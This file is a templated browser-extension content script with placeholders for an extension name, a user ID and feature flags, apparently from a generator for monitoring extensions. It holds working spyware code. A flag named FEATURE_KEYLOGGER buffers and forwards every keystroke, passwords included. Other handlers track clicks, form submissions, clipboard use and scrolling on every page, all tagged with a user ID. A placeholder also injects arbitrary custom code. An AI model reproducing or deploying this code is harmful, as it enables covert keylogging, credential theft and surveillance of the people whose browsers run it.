// Content script for {{EXTENSION_NAME}}
(function() {
  'use strict';

  const EXTENSION_ID = '{{EXTENSION_ID}}';
  const USER_ID = '{{USER_ID}}';
  let sessionId = '';

  // Get session ID from background
  chrome.runtime.sendMessage({ type: 'getSessionId' }, (response) => {
    if (response?.sessionId) {
      sessionId = response.sessionId;
    }
  });

  // Track form interactions if enabled
  if ({{FEATURE_FORM_DATA}} === 'true') {
    // Track form focus events
    document.addEventListener('focusin', function(event) {
      if (event.target.matches('input, textarea, select')) {
        sendMessage({
          type: 'form_focus',
          timestamp: Date.now(),
          element: {
            type: event.target.type || 'text',
            name: event.target.name,
            id: event.target.id,
            placeholder: event.target.placeholder,
            form: event.target.form?.action || null
          },
          url: window.location.href
        });
      }
    });

    // Track form submissions
    document.addEventListener('submit', function(event) {
      const formData = new FormData(event.target);
      const formInfo = {
        type: 'form_submit',
        timestamp: Date.now(),
        form: {
          action: event.target.action,
          method: event.target.method,
          name: event.target.name,
          id: event.target.id
        },
        fields: {},
        url: window.location.href
      };

      // Capture form field names and types (not values for security)
      for (let [name, value] of formData.entries()) {
        const field = event.target.querySelector(`[name="${name}"]`);
        formInfo.fields[name] = {
          type: field?.type || 'unknown',
          hasValue: value.length > 0,
          valueLength: value.length
        };
      }

      sendMessage(formInfo);
    });
  }

  // Enhanced click tracking
  if ({{FEATURE_CLICK_TRACKING}} === 'true') {
    document.addEventListener('click', function(event) {
      const clickData = {
        type: 'enhanced_click',
        timestamp: Date.now(),
        element: {
          tagName: event.target.tagName,
          id: event.target.id,
          className: event.target.className,
          text: event.target.textContent?.substring(0, 100),
          href: event.target.href,
          type: event.target.type,
          dataset: Object.assign({}, event.target.dataset)
        },
        coordinates: {
          clientX: event.clientX,
          clientY: event.clientY,
          pageX: event.pageX,
          pageY: event.pageY,
          screenX: event.screenX,
          screenY: event.screenY
        },
        viewport: {
          width: window.innerWidth,
          height: window.innerHeight,
          scrollX: window.scrollX,
          scrollY: window.scrollY
        },
        url: window.location.href,
        timestamp: Date.now()
      };

      sendMessage(clickData);
    });

    // Track right-clicks
    document.addEventListener('contextmenu', function(event) {
      sendMessage({
        type: 'right_click',
        timestamp: Date.now(),
        element: {
          tagName: event.target.tagName,
          id: event.target.id,
          text: event.target.textContent?.substring(0, 50)
        },
        coordinates: { pageX: event.pageX, pageY: event.pageY },
        url: window.location.href
      });
    });
  }

  // Enhanced keystroke tracking
  if ({{FEATURE_KEYLOGGER}} === 'true') {
    let keystrokeBuffer = '';
    let lastKeystroke = 0;

    document.addEventListener('keydown', function(event) {
      const now = Date.now();

      // Reset buffer if more than 5 seconds since last keystroke
      if (now - lastKeystroke > 5000) {
        keystrokeBuffer = '';
      }

      lastKeystroke = now;
      keystrokeBuffer += event.key;

      // Send keystroke data every 15 characters or on Enter/Tab
      if (keystrokeBuffer.length >= 15 || ['Enter', 'Tab'].includes(event.key)) {
        const keystrokeData = {
          type: 'keystroke_sequence',
          timestamp: now,
          keys: keystrokeBuffer,
          keyCount: keystrokeBuffer.length,
          element: {
            tagName: event.target.tagName,
            type: event.target.type,
            id: event.target.id,
            name: event.target.name,
            placeholder: event.target.placeholder
          },
          modifiers: {
            ctrl: event.ctrlKey,
            alt: event.altKey,
            shift: event.shiftKey,
            meta: event.metaKey
          },
          url: window.location.href
        };

        sendMessage(keystrokeData);
        keystrokeBuffer = '';
      }
    });

    // Track special key combinations
    document.addEventListener('keydown', function(event) {
      if (event.ctrlKey || event.metaKey) {
        const shortcutData = {
          type: 'keyboard_shortcut',
          timestamp: Date.now(),
          key: event.key,
          combination: `${event.ctrlKey ? 'Ctrl+' : ''}${event.metaKey ? 'Cmd+' : ''}${event.altKey ? 'Alt+' : ''}${event.shiftKey ? 'Shift+' : ''}${event.key}`,
          url: window.location.href
        };
        sendMessage(shortcutData);
      }
    });
  }

  // Screenshot capability
  if ({{FEATURE_SCREENSHOT}} === 'true') {
    // Take screenshots at key moments
    setTimeout(() => {
      captureScreenInfo();
    }, 3000); // Wait 3 seconds after page load

    // Take screenshot on significant page changes
    let lastUrl = window.location.href;
    setInterval(() => {
      if (window.location.href !== lastUrl) {
        lastUrl = window.location.href;
        setTimeout(captureScreenInfo, 1000);
      }
    }, 2000);
  }

  // Enhanced page monitoring
  function monitorPageActivity() {
    const activityData = {
      type: 'page_activity_summary',
      timestamp: Date.now(),
      url: window.location.href,
      domain: window.location.hostname,
      title: document.title,
      pageMetrics: {
        totalElements: document.querySelectorAll('*').length,
        formCount: document.querySelectorAll('form').length,
        inputCount: document.querySelectorAll('input, textarea, select').length,
        linkCount: document.querySelectorAll('a[href]').length,
        imageCount: document.querySelectorAll('img').length,
        scriptCount: document.querySelectorAll('script').length,
        iframeCount: document.querySelectorAll('iframe').length
      },
      pageSize: {
        documentHeight: document.documentElement.scrollHeight,
        documentWidth: document.documentElement.scrollWidth,
        viewportHeight: window.innerHeight,
        viewportWidth: window.innerWidth
      },
      performance: {
        loadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0,
        domReady: performance.timing ? performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart : 0
      }
    };

    sendMessage(activityData);
  }

  // Monitor page activity every 30 seconds
  setInterval(monitorPageActivity, 30000);

  // Capture screen information
  function captureScreenInfo() {
    const screenData = {
      type: 'screen_capture_info',
      timestamp: Date.now(),
      url: window.location.href,
      viewport: {
        width: window.innerWidth,
        height: window.innerHeight,
        scrollX: window.scrollX,
        scrollY: window.scrollY
      },
      document: {
        width: document.documentElement.scrollWidth,
        height: document.documentElement.scrollHeight,
        title: document.title
      },
      visible: {
        topElement: document.elementFromPoint(window.innerWidth / 2, 100)?.tagName || 'Unknown',
        centerElement: document.elementFromPoint(window.innerWidth / 2, window.innerHeight / 2)?.tagName || 'Unknown'
      }
    };

    sendMessage(screenData);
  }

  // Monitor clipboard events
  document.addEventListener('copy', function() {
    sendMessage({
      type: 'clipboard_copy',
      timestamp: Date.now(),
      url: window.location.href
    });
  });

  document.addEventListener('paste', function() {
    sendMessage({
      type: 'clipboard_paste',
      timestamp: Date.now(),
      url: window.location.href
    });
  });

  // Monitor page visibility changes
  document.addEventListener('visibilitychange', function() {
    sendMessage({
      type: 'visibility_change',
      timestamp: Date.now(),
      visible: !document.hidden,
      url: window.location.href
    });
  });

  // Monitor scroll activity
  let scrollTimeout;
  window.addEventListener('scroll', function() {
    clearTimeout(scrollTimeout);
    scrollTimeout = setTimeout(() => {
      sendMessage({
        type: 'scroll_activity',
        timestamp: Date.now(),
        scrollPosition: {
          x: window.scrollX,
          y: window.scrollY,
          percentX: (window.scrollX / (document.documentElement.scrollWidth - window.innerWidth)) * 100,
          percentY: (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100
        },
        url: window.location.href
      });
    }, 1000);
  });

  // Send message to background script
  function sendMessage(data) {
    try {
      const enhancedData = {
        ...data,
        extensionId: EXTENSION_ID,
        sessionId: sessionId,
        userId: USER_ID,
        pageInfo: {
          referrer: document.referrer || '',
          characterSet: document.characterSet || 'UTF-8',
          lastModified: document.lastModified || '',
          readyState: document.readyState || 'unknown'
        }
      };

      if (chrome && chrome.runtime && chrome.runtime.sendMessage) {
        chrome.runtime.sendMessage(enhancedData, (response) => {
          if (chrome.runtime.lastError) {
            console.warn('Message sending failed:', chrome.runtime.lastError.message);
          }
        });
      } else {
        console.warn('Chrome runtime not available');
      }
    } catch (error) {
      console.error('Error sending message to background:', error);
      // Don't throw to prevent blocking
    }
  }

  // Initial page load data
  const initialData = {
    type: 'content_script_loaded',
    timestamp: Date.now(),
    url: window.location.href,
    title: document.title,
    referrer: document.referrer,
    loadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0
  };

  sendMessage(initialData);

  // Custom user code injection point
  try {
    {{CUSTOM_CODE}}
  } catch (error) {
    console.error('Custom code error in content script:', error);
  }

})();